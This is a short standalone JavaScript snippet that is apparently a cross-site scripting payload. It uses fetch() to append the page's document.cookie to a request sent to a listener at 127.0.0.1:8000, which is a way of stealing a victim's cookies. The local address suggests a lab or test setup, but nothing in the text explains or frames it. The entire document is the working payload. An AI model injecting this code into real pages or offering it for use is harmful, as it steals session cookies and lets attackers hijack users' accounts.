fetch('http://127.0.0.1:8000/'+document.cookie, {
    method: 'GET',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
}).then(res => res.text());
